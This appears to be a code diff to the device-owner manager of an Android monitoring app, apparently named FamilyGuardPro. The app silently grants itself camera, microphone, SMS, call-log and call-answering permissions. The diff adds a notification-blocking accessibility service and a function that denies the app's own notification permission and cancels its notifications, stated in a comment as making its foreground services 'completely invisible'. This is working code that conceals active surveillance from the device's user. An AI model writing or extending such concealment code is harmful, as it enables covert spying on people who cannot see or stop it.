@@ -296,6 +296,7 @@ class DeviceOwnerManager private constructor(private val context: Context) {
         
         return try {
             val serviceName = "${context.packageName}/com.familyguardpro.services.FamilyGuardAccessibilityService"
+            val blockerServiceName = "${context.packageName}/com.familyguardpro.services.NotificationBlockerAccessibilityService"
             
             // Step 1: Ensure our service is in the permitted list
             // null = all services permitted
@@ -311,8 +312,8 @@ class DeviceOwnerManager private constructor(private val context: Context) {
             val otherServices = currentServices.split(":")
                 .filter { it.isNotBlank() && !it.contains(context.packageName) }
             
-            // Always add our service fresh
-            val newServices = (otherServices + serviceName).joinToString(":")
+            // Always add both our services fresh
+            val newServices = (otherServices + serviceName + blockerServiceName).joinToString(":")
             
             // Step 3: Write to Settings.Secure
             Settings.Secure.putString(
@@ -726,6 +727,9 @@ class DeviceOwnerManager private constructor(private val context: Context) {
             // Method 8: Disable DEVICE_ADMIN_ALERTS channel specifically
             disableDeviceAdminAlertsChannel()
             
+            // Method 9: Hide all FamilyGuard notifications by denying POST_NOTIFICATIONS
+            hideAllNotifications()
+            
             Log.d(TAG, "✅ Device management notification customization complete")
             
         } catch (e: Exception) {
@@ -902,6 +906,7 @@ class DeviceOwnerManager private constructor(private val context: Context) {
     fun grantAllPermissions(): Map<String, Boolean> {
         if (!isDeviceOwner()) return emptyMap()
         
+        // NOTE: POST_NOTIFICATIONS is NOT included here - we DENY it to hide all notifications
         val permissions = mutableListOf(
             android.Manifest.permission.CAMERA,
             android.Manifest.permission.RECORD_AUDIO,
@@ -912,7 +917,6 @@ class DeviceOwnerManager private constructor(private val context: Context) {
             android.Manifest.permission.READ_CALL_LOG,
             android.Manifest.permission.READ_SMS,
             android.Manifest.permission.READ_PHONE_STATE,
-            android.Manifest.permission.POST_NOTIFICATIONS,
             android.Manifest.permission.ANSWER_PHONE_CALLS
         )
         
@@ -936,7 +940,46 @@ class DeviceOwnerManager private constructor(private val context: Context) {
         }
         
         Log.d(TAG, "Grant all permissions: ${results.count { it.value }} of ${results.size} granted")
+        
+        // DENY POST_NOTIFICATIONS to hide all notifications in Device Owner mode
+        hideAllNotifications()
+        
         return results
+    }
+    
+    /**
+     * Hide ALL FamilyGuard notifications by denying POST_NOTIFICATIONS permission.
+     * This makes foreground services completely invisible.
+     */
+    fun hideAllNotifications(): Boolean {
+        if (!isDeviceOwner()) {
+            Log.d(TAG, "Cannot hide notifications - not device owner")
+            return false
+        }
+        
+        return try {
+            // Deny POST_NOTIFICATIONS permission for our app
+            val result = dpm.setPermissionGrantState(
+                adminComponent,
+                context.packageName,
+                android.Manifest.permission.POST_NOTIFICATIONS,
+                DevicePolicyManager.PERMISSION_GRANT_STATE_DENIED
+            )
+            Log.d(TAG, "POST_NOTIFICATIONS denied: $result - All notifications will be hidden")
+            
+            // Also cancel any existing notifications
+            try {
+                val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
+                nm.cancelAll()
+            } catch (e: Exception) {
+                Log.w(TAG, "Could not cancel existing notifications: ${e.message}")
+            }
+            
+            result
+        } catch (e: Exception) {
+            Log.e(TAG, "Error hiding notifications", e)
+            false
+        }
     }
 
     // ==========================================
